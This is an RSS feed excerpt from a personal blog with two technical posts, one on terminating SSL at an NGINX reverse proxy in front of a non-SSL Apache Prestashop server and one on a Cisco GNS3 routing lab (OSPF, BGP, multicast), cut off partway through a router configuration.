<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Carlo Alberto Scola</title>
    <description>My Personal Blog</description>
    <link>https://carloalbertoscola.it//</link>
    <atom:link href="https://carloalbertoscola.it//feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sun, 20 Jan 2019 18:17:34 +0100</pubDate>
    <lastBuildDate>Sun, 20 Jan 2019 18:17:34 +0100</lastBuildDate>
    <generator>Jekyll v3.4.3</generator>
    
      <item>
        <title>Enabling SSL on NGINX reverse proxy towards non-SSL apache</title>
        <description>&lt;h1 id=&quot;enabling-ssl-on-nginx-reverse-proxy-towards-non-ssl-apache&quot;&gt;&lt;strong&gt;Enabling SSL on NGINX reverse proxy towards non-SSL apache&lt;/strong&gt;&lt;/h1&gt;
&lt;h2 id=&quot;nginx-and-apache-prestashop-docker-containers&quot;&gt;NGINX and APACHE Prestashop Docker containers&lt;/h2&gt;
&lt;center&gt; Last modified: 17 January 2019 &lt;/center&gt;

&lt;p&gt;My Setup is as follow:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;NGINX web facing proxy (docker container) that accepts connections on port 80/443.&lt;/li&gt;
  &lt;li&gt;APACHE internal web server (docker container) hosting the Prestashop website&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Prestashop 1.7.3 is installed in an internal server with APACHE.&lt;/p&gt;

&lt;p&gt;NGINX is the main web proxy which forwards encrypted requests to internal UNENCRYPTED server running APACHE (also docker containers).&lt;/p&gt;

&lt;p&gt;So the setup is:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;INTERNET –(SSL)–&amp;gt; NGINX —(NON-SSL)—&amp;gt;INTERNAL SERVER (apache)&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;It is &lt;strong&gt;useless&lt;/strong&gt; to set up TLS also on the apache web server, it would be redundant and would add more load on the server.&lt;/p&gt;

&lt;h2 id=&quot;problem&quot;&gt;&lt;strong&gt;Problem&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;The problem is that I cannot enable SSL on Prestashop directly on the internal Apache web server which hosts the code. Apache uses port 80 and would get redirection loops towards the proxy server.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Without enabling SSL on prestashop, it doesnt rewrite URLs to the correct https scheme.&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;My actual _nginx.conf:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;server {
        listen      80 reuseport;
        server_name  localhost &amp;lt;domain&amp;gt;;
        
        
        modsecurity off;
        modsecurity_rules_file /etc/nginx/modsecurity.d/include.conf;
        server_tokens off;

        add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot; always;

        rewrite ^ https://&amp;lt;domain&amp;gt;$request_uri? permanent;

    }

    server {
        listen       443 ssl default_server http2;
        server_name  &amp;lt;domain&amp;gt;;

        ssl_certificate      certs/cert.pem;
        ssl_certificate_key  certs/privkey.pem;

        ssl_session_cache    shared:SSL:10m;
        ssl_session_timeout  15m;

        ssl_ciphers  HIGH:!aNULL:!MD5;
        ssl_prefer_server_ciphers  on;

        ssl_protocols TLSv1.2;
        ssl_ecdh_curve secp384r1;

        ssl_stapling on;
        ssl_stapling_verify on;

#       add_header Strict-Transport-Security &quot;max-age=31536000; includeSubDomains&quot; always;
        add_header X-Frame-Options SAMEORIGIN;
        add_header X-Content-Type-Options nosniff;
        add_header Referrer-Policy &quot;strict-origin&quot; always;
        add_header X-XSS-Protection &quot;1; mode=block&quot;;
        add_header Content-Security-Policy &quot;upgrade-insecure-requests;  ... ;


        location / {
            resolver 127.0.0.11 valid=30s;

            proxy_pass   http://APACHE_PRIVATE_IP;
            proxy_http_version 1.1;           

            #proxy_set_header Host APACHE_PRIVATE_IP;
            proxy_set_header Host  &amp;lt;domain&amp;gt;;
            index index.html index.php;

            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
            proxy_set_header X-Real-IP $remote_addr;            
            
            root APACHE_ROOT_DIR/htdocs/DOMAIN;
            proxy_bind  MODSEC_INT_IP;
            proxy_pass_request_headers      on;
        }
    }


}

&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Note:&lt;/p&gt;

&lt;p&gt;If you also need &lt;a href=&quot;https://github.com/SpiderLabs/ModSecurity&quot;&gt;&lt;strong&gt;&lt;em&gt;ModSecurity Web Application Firewall&lt;/em&gt;&lt;/strong&gt;&lt;/a&gt;, you just need to install first the rules (&lt;a href=&quot;https://coreruleset.org/&quot;&gt;OWASP core ruleset&lt;/a&gt;) and then use these two lines:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;modsecurity on;
modsecurity_rules_file /etc/nginx/modsecurity.d/include.conf;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;solution&quot;&gt;&lt;strong&gt;Solution&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;On NGINX using&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rewrite ^ https://&amp;lt;DOMAIN&amp;gt;$request_uri? permanent;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;First:  I need prestashop to create &lt;strong&gt;https&lt;/strong&gt; links instead of &lt;strong&gt;http&lt;/strong&gt; link though the function &lt;strong&gt;&lt;em&gt;BaseLink&lt;/em&gt;&lt;/strong&gt; so i changed “http” to “https” in the last row:&lt;/p&gt;

&lt;p&gt;File: &lt;em&gt;classes/Link.php&lt;/em&gt;&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;public function getBaseLink($idShop = null, $ssl = null, $relativeProtocol = false)
    {
   ﻿     static $force_ssl = true;  /*CHANGED null to true */

        if ($ssl === null) {
            if ($force_ssl === null) {
                $force_ssl = (Configuration::get('PS_SSL_ENABLED') &amp;amp;&amp;amp; Configuration::get('PS_SSL_ENABLED_EVERYWHERE'));
            }
            $ssl = $force_ssl;
        }
﻿
        if (Configuration::get('PS_MULTISHOP_FEATURE_ACTIVE') &amp;amp;&amp;amp; $idShop !== null) {
            $shop = new Shop($idShop);
        } else {
            $shop = Context::getContext()-&amp;gt;shop;
        }

        if ($relativeProtocol) {
            $base = '//'.($ssl &amp;amp;&amp;amp; $this-&amp;gt;ssl_enable ? $shop-&amp;gt;domain_ssl : $shop-&amp;gt;domain);
        } else {
            $base = (($ssl &amp;amp;&amp;amp; $this-&amp;gt;ssl_e﻿nable) ? 'https://'.$shop-&amp;gt;domain_ssl : 'https://'.$shop-&amp;gt;domain); /*CHANGED second http to https */
        }

        return $base.$shop-&amp;gt;getBaseURI();
    }
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;I just forced PS to use https whether it is activated or not.&lt;/p&gt;

&lt;p&gt;Now the back office works flawlessly but the front end get loop redirection because apache sees HTTP requests instead of HTTPS ones and so send a Location header to the HTTPS site.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Now you just need to make apache believe those are HTTPS requests even if those are actually HTTP so add these lines in NGINX reverse proxy nginx.conf:&lt;/strong&gt;&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;proxy_set_header X-Scheme https;
proxy_set_header X-Forwarded-Proto https;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and everything works!&lt;/p&gt;

&lt;h3 id=&quot;prestashop-forum&quot;&gt;Prestashop Forum&lt;/h3&gt;
&lt;p&gt;My question with related answer is also on the official Prestashop forum &lt;a href=&quot;https://www.prestashop.com/forums/topic/890871-solvedenabling-ssl-on-nginx-reverse-proxy-towards-non-ssl-apache&quot;&gt;&lt;strong&gt;here&lt;/strong&gt;&lt;/a&gt;.&lt;/p&gt;
</description>
        <pubDate>Tue, 15 Jan 2019 00:00:00 +0100</pubDate>
        <link>https://carloalbertoscola.it//2019/web/security/prestashop-ssl-NGINX-reverse-proxy-to-non-ssl-apache/</link>
        <guid isPermaLink="true">https://carloalbertoscola.it//2019/web/security/prestashop-ssl-NGINX-reverse-proxy-to-non-ssl-apache/</guid>
        
        
        <category>web</category>
        
        <category>security</category>
        
      </item>
    
      <item>
        <title>A Cisco routing lab network with GNS3. [Part 1]</title>
        <description>&lt;h1 id=&quot;-how-to-configure-cisco-routers-with-routing-protocols-&quot;&gt;&lt;center style=&quot;font-weight: bold&quot;&gt; How to configure Cisco routers with routing protocols. &lt;/center&gt;&lt;/h1&gt;
&lt;h2 id=&quot;bgp-ospf-hsrp-and-multicast-routing-part-1&quot;&gt;BGP, OSPF, HSRP and Multicast routing. &lt;strong&gt;[PART 1]&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;lets-set-up-a-virtual-router-environment-from-scratch&quot;&gt;Let’s set up a virtual router environment from scratch!&lt;/h3&gt;
&lt;p&gt;&lt;em&gt;Last modified:&lt;/em&gt; 17 January 2019&lt;/p&gt;

&lt;p&gt;Hello everybody, in this post we are going to learn step by step how to setup a fully functioning network environment with the help of &lt;a href=&quot;https://www.gns3.com/&quot;&gt;&lt;em&gt;Graphical Network Simulator-3&lt;/em&gt;&lt;/a&gt; (&lt;strong&gt;GNS3&lt;/strong&gt;). This exercise aims to be helpful with the study of network routing protocols.&lt;/p&gt;

&lt;p&gt;We are going to create an ISP basic network.&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;&lt;strong&gt;Network topology explanation&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Routing protocol choices&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Fault tolerant routing&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Multicast routing&lt;/strong&gt;.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;The full code configuration of the four Cisco routers is found at the end of the page.&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;Table of Acronyms&lt;/th&gt;
      &lt;th&gt; &lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;BGP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Border Gateway Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;OSPF&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Open Shortest Path First&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;RIP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Routing Information Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;AS&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Autonomous System&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;HSRP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Hot Standby Router Protocol&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;PIM&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Protocol Independent Multicast&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;&lt;strong&gt;RP&lt;/strong&gt;&lt;/td&gt;
      &lt;td&gt;Rendezvous Point&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h2 id=&quot;network-equipment--virtual&quot;&gt;Network Equipment  (virtual)&lt;/h2&gt;
&lt;ul&gt;
  &lt;li&gt;4 Cisco 7301 routers&lt;/li&gt;
  &lt;li&gt;2 HP2524 switches (one is for server network and one for client network)&lt;/li&gt;
  &lt;li&gt;Virtual Machines (both on server and client network)&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;-network-topology-&quot;&gt;&lt;center style=&quot;font-weight: bold&quot;&gt; Network Topology &lt;/center&gt;&lt;/h2&gt;
&lt;p&gt;The network topology we are going to recreate is described as follow:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/routers_setup_lab_gns3.png&quot; alt=&quot;network topology routers autonomous systems&quot; /&gt;&lt;/p&gt;
&lt;center&gt; Figure 1. Full Network topology. &lt;/center&gt;
&lt;p&gt;Let’s explain the topology in details.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;The &lt;strong&gt;AS13&lt;/strong&gt; is our competence &lt;em&gt;Autonomous System&lt;/em&gt; and we can consider it as managed by our ISP called &lt;em&gt;isp5&lt;/em&gt;.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;AS2&lt;/strong&gt; is considered the router connected to the backbone network, providing connectivity.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;AS14&lt;/strong&gt; is considered an other ISP’s border router.&lt;/li&gt;
  &lt;li&gt;AS14 is also considered a &lt;strong&gt;Peering ISP&lt;/strong&gt;, meaning in case of network failures, traffic can flow from one ISP to the other to allow Internet reachability.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Inside our &lt;strong&gt;AS13&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;RTA and RTB&lt;/strong&gt; are &lt;strong&gt;area border routers&lt;/strong&gt;. They are both &lt;strong&gt;e-BGP&lt;/strong&gt; (to the outside) and &lt;strong&gt;i-BGP&lt;/strong&gt; (to the inside) peers.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;RTA&lt;/strong&gt; is e-BGP peering with AS2. &lt;strong&gt;RTB&lt;/strong&gt; is e-BGP peering with AS14. Internally, RTA and RTB are i-BGP peers.&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;RTC and RTD&lt;/strong&gt; provide fault tolerant access to server and client networks respectively.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;dynamic-ip-routing&quot;&gt;&lt;strong&gt;Dynamic IP routing&lt;/strong&gt;&lt;/h1&gt;
&lt;p&gt;For the internal routing, Open Shortest Path First or &lt;strong&gt;OSPF&lt;/strong&gt; version 2 will be used. &lt;strong&gt;RTA&lt;/strong&gt; and &lt;strong&gt;RTB&lt;/strong&gt; will also advertise the &lt;em&gt;default route&lt;/em&gt; through OSPF.&lt;/p&gt;

&lt;p&gt;Border Gateway Protocol or &lt;strong&gt;BGP&lt;/strong&gt; is used for external routing &lt;strong&gt;AS13-AS2&lt;/strong&gt; and &lt;strong&gt;AS13-AS14&lt;/strong&gt;:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;To direct the traffic we will set BGP &lt;strong&gt;local preferences&lt;/strong&gt; for routes from AS2 and AS14.&lt;/li&gt;
  &lt;li&gt;RTA and RTB will advertise AS13’s OSPF paths to AS2 and AS14.&lt;/li&gt;
  &lt;li&gt;Routes coming from AS2 will have &lt;strong&gt;higher&lt;/strong&gt; local preference value and will be the preferred ones.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The link &lt;strong&gt;RTA-AS2&lt;/strong&gt; is called &lt;em&gt;primary link&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;The link &lt;strong&gt;RTB-AS14&lt;/strong&gt; is called &lt;em&gt;private link&lt;/em&gt;.&lt;/p&gt;

&lt;h2 id=&quot;ospf-configuration&quot;&gt;&lt;strong&gt;OSPF Configuration&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Let’s assume each router has its interfaces already configured with the IP addresses shown in the Figure 1.&lt;/p&gt;

&lt;p&gt;Firstly for each router we set up the &lt;code class=&quot;highlighter-rouge&quot;&gt;router-id&lt;/code&gt; correspondent to the router loopback address with: (RTA’s OSPF mode example)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;router-id 10.5.4.1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In &lt;strong&gt;RTA&lt;/strong&gt;’s OSPF setting, we will use “&lt;em&gt;default-information originate always metric 20&lt;/em&gt;” to distribute default route to RTC and RTD. This default route points to RTA. RTB will not apply this default route since it is also a border router.&lt;/p&gt;

&lt;p&gt;In &lt;strong&gt;RTB&lt;/strong&gt;’s OSPF setting, we will use “&lt;em&gt;default-information originate always metric 200&lt;/em&gt;” to distribute default route to RTC and RTD. This default route points to RTB. RTA will not apply this default route since it is also a border router.&lt;/p&gt;

&lt;p&gt;[Note] &lt;strong&gt;RTA&lt;/strong&gt;’s metric 20 &amp;lt; &lt;strong&gt;RTB&lt;/strong&gt;’s metric 200.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Why? Because we want to route traffic to the peering ISP &lt;strong&gt;only&lt;/strong&gt; if some failures happen on the primary link.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Then &lt;strong&gt;RTC&lt;/strong&gt; and &lt;strong&gt;RTD&lt;/strong&gt; will choose &lt;strong&gt;RTA&lt;/strong&gt; as default route destination but NOTE, in &lt;strong&gt;RTC&lt;/strong&gt; and &lt;strong&gt;RTD&lt;/strong&gt;’s routing table, the default route only shows the &lt;strong&gt;next-hop&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;If the primary link is down, &lt;strong&gt;RTC&lt;/strong&gt; and &lt;strong&gt;RTD&lt;/strong&gt; will send the packets outside only through &lt;strong&gt;RTB&lt;/strong&gt;. &lt;strong&gt;RTB&lt;/strong&gt; will then forward the packets to the outside using the private link. If RTA is down, &lt;strong&gt;RTC&lt;/strong&gt; and &lt;strong&gt;RTD&lt;/strong&gt; will choose &lt;strong&gt;RTB&lt;/strong&gt; as default route destination.&lt;/p&gt;

&lt;h3 id=&quot;rta-ospf-configuration&quot;&gt;RTA OSPF Configuration&lt;/h3&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;router ospf 1
    router-id 10.5.4.1
    network 10.5.1.0 0.0.0.3 area 0
    network 10.5.0.0 0.0.0.3 area 0
    network 10.5.4.1 0.0.0.0 area 0
    default-information originate always metric 20
    exit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;blockquote&gt;
  &lt;p&gt;[for newcomers]
&lt;code class=&quot;highlighter-rouge&quot;&gt;network &amp;lt;ip-address&amp;gt; &amp;lt;wildcard-mask&amp;gt; area &amp;lt;area-id&amp;gt;&lt;/code&gt; : Defines an interface on which OSPF runs and defines the area ID for that interface.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;For each router we are telling OSPF to advertise the ip and the netmask reachable by the router to the selected &lt;em&gt;area&lt;/em&gt; (in this case 0, backbone).&lt;/p&gt;

&lt;p&gt;After this step each router should be able to discover and communicate to each other.&lt;/p&gt;

&lt;p&gt;For every possible information about OSPF commands and configuration the &lt;a href=&quot;https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/iproute_ospf/configuration/xe-16/iro-xe-16-book/iro-cfg.html&quot;&gt;Cisco OSPF official guide&lt;/a&gt; is a must read.&lt;/p&gt;

&lt;p&gt;Other routers OSPF configurations are at the end of the article.&lt;/p&gt;
&lt;h2 id=&quot;bgp-configuration&quot;&gt;&lt;strong&gt;BGP configuration&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;Firstly for each router we set up the &lt;code class=&quot;highlighter-rouge&quot;&gt;router-id&lt;/code&gt; correspondent to the router loopback address with:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bgp router-id 10.5.4.1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In &lt;strong&gt;RTA&lt;/strong&gt;’s BGP setting, we aggregate the addresses to 10.5.0.0/20 (since our network is using this segment we don’t want to advertise multiple useless routes, just the main one is necessary to reach AS13). We also redistribute our OSPF route in BGP (or we could add RTA’s nearby network 10.5.0.0/30 and 10.5.1.0/30). 
This is done with: (RTA)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;aggregate-address 10.5.0.0 255.255.240.0 summary-only
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In &lt;strong&gt;RTA&lt;/strong&gt;’s routing table, we also add a static route to &lt;strong&gt;RTB&lt;/strong&gt;’s Loopback address for network 10.5.5.0/30. Since we use aggregate-address in RTA’s BGP setting, it will include 10.5.5.0/30. Actually RTA does not know where &lt;strong&gt;RTB&lt;/strong&gt;’s Loopback is at all. RTB will not advertise that network to OSPF or BGP.
This is done with: (RTA)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip route 10.5.5.0 255.255.255.252 10.5.4.2
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;In addition, we are also using Loopback of RTA and RTB to establish the BGP TCP connections. This avoids failed interfaces and links with the help of OSPF routing.&lt;/p&gt;

&lt;h3 id=&quot;bgp-neighbors&quot;&gt;BGP neighbors&lt;/h3&gt;
&lt;p&gt;Next we set up the BGP peering with AS2 and AS14.&lt;/p&gt;

&lt;p&gt;In RTA we will set up AS2 as &lt;strong&gt;E-BGP&lt;/strong&gt; peer and RTB as &lt;strong&gt;I-BGP&lt;/strong&gt; peer.&lt;/p&gt;

&lt;p&gt;We set up the neighboring to the destination IP as:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neighbor 10.0.32.1 remote-as 2
neighbor 10.5.4.2 remote-as 13
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Next we set up the &lt;strong&gt;next-hop-self&lt;/strong&gt; bgp attribute.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neighbor 10.5.4.2 next-hop-self
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;When a new route from an e-bgp peer is learned from RTA, the internal peer (RTB) will learn the prefix through i-bgp. If RTB does not have a route towards that IP, RTB will not be able to forward packets.
The &lt;strong&gt;next-hop-self&lt;/strong&gt; BGP attribute allow the internal bgp peer (RTB) to set the RTA address as ‘&lt;em&gt;next-hop&lt;/em&gt;’ for routes learned from i-bgp. This way RTB will forward packets to RTA, and than it is RTA responsibility to forward out those packets.&lt;/p&gt;

&lt;p&gt;BGP gives us an option to change the source of packets sent. In this case we can use Loopback interface as source of BGP packets sent between these neighbors. This way if one of the paths fails, the other will be used. Moreover by using loopback interface as update source, the benefit is that the BGP session won’t go down when physical interface goes down.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neighbor 10.5.4.2 update-source loopback 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Finally to redistribute OSPF routes into BGP:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;redistribute ospf 1
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;complete-bgp-configuration-of-router-rta&quot;&gt;Complete BGP configuration of Router RTA&lt;/h3&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;router bgp 13
    bgp router-id 10.5.4.1
    aggregate-address 10.5.0.0 255.255.240.0 summary-only
    redistribute ospf 1
    neighbor 10.0.32.1 remote-as 2
    neighbor 10.0.32.1 route-map PREF_FROM_AS2 in
    neighbor 10.5.4.2 remote-as 13
    neighbor 10.5.4.2 next-hop-self
    neighbor 10.5.4.2 update-source loopback 1
    no auto-summary
    no synchronization
    exit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;fault-tolerant-ip-routing&quot;&gt;&lt;strong&gt;Fault-tolerant IP routing&lt;/strong&gt;&lt;/h2&gt;
&lt;h3 id=&quot;from-as13-to-the-internet&quot;&gt;From AS13 To the Internet&lt;/h3&gt;
&lt;p&gt;We are going to set up our &lt;strong&gt;AS13&lt;/strong&gt; area with one back up link.&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;When the link &lt;strong&gt;&lt;em&gt;RTA-AS2&lt;/em&gt;&lt;/strong&gt; is operating without errors, all the AS13’s traffic will be routed to the Internet through the link RTA-AS2 with the use of &lt;strong&gt;BGP&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;When the link &lt;strong&gt;&lt;em&gt;RTA-AS2&lt;/em&gt;&lt;/strong&gt; is down, for whatever reason, all traffic will be routed to the backup link &lt;strong&gt;&lt;em&gt;RTB-AS14&lt;/em&gt;&lt;/strong&gt;. From there, the peering ISP will forward the traffic correctly to the AS2.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;When the link to AS2 is down, after a timer timeout, &lt;strong&gt;RTB&lt;/strong&gt; will spread its BGP route to OSPF so that the &lt;em&gt;default route&lt;/em&gt; to AS2 will be through AS14.&lt;/p&gt;

&lt;h3 id=&quot;how-to-setup-primary-and-secondary-link&quot;&gt;How to setup primary and secondary link&lt;/h3&gt;
&lt;p&gt;To set default route to RTA, and back up route to RTB for outgoing connections to outside we first create a &lt;code class=&quot;highlighter-rouge&quot;&gt;route-map&lt;/code&gt; for &lt;strong&gt;incoming&lt;/strong&gt; routes in BGP config mode: (RTA)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neighbor 10.0.32.1 route-map PREF_FROM_AS2 in
exit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;“PREF_FROM_AS2” is the name of the route-map.
It means “all the routes coming (&lt;strong&gt;in&lt;/strong&gt;) from AS2”.&lt;/p&gt;

&lt;p&gt;then we define the route-map this way: (RTA)&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;route-map PREF_FROM_AS2 permit 20
set local-preference 300
exit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;While in RTB the local preference is lower:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;neighbor 10.5.5.1 route-map PREF_FROM_AS14 in  
exit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;route-map PREF_FROM_AS14 permit 10
set local-preference 200
exit
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h2 id=&quot;multicast-routing&quot;&gt;&lt;strong&gt;Multicast Routing&lt;/strong&gt;&lt;/h2&gt;
&lt;p&gt;RTC’s loopback1 will act as PIM &lt;em&gt;Rendezvous Point&lt;/em&gt; &lt;strong&gt;RP&lt;/strong&gt;. In addition, we will not enable PIM on RTA and RTB’s fa1/1 interfaces 
avoiding multicast protocol to affect other AS.&lt;/p&gt;

&lt;p&gt;To set up PIM on an interface:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip pim sparse-mode
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;To set the RP:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ip pim rp-address 10.5.4.3
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We set up the PIM RP close to the server network, since the servers usually mostly provide the multicast services.&lt;/p&gt;

&lt;h3 id=&quot;complete-rta-router-configuration&quot;&gt;&lt;strong&gt;Complete RTA router configuration&lt;/strong&gt;&lt;/h3&gt;
&lt;p&gt;This config is ready to be copy-pasted in the router config mode.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;conf t
hostname RTA
ip multicast-routing 

interface fastEthernet 1/1
ip address 10.0.32.2 255.255.255.252
no shut

interface gigabitEthernet 0/2
ip address 10.5.1.1 255.255.255.252
ip ospf cost 2
ip pim sparse-mode 
no shut

interface gigabitEthernet 0/0
ip address 10.5.0.1 255.255.255.252
ip pim sparse-mode 
no shut

interface loopback 1
ip address 10.5.4.1 255.255.255.255
no shut

exit

ip pim rp-address 10.5.4.3

router ospf 1
router-id 10.5.4.1
network 10.5.1.0 0.0.0.3 area 0
network 10.5.0.0 0.0.0.3 area 0
network 10.5.4.1 0.0.0.0 area 0
default-information originate always metric 20
exit

route-map PREF_FROM_AS2 permit 20
set local-preference 300
exit

router bgp 13
bgp router-id 10.5.4.1
no network 10.0.32.0 mask 255.255.255.252
aggregate-address 10.5.0.0 255.255.240.0 summary-only
redistribute ospf 1
neighbor 10.0.32.1 remote-as 2
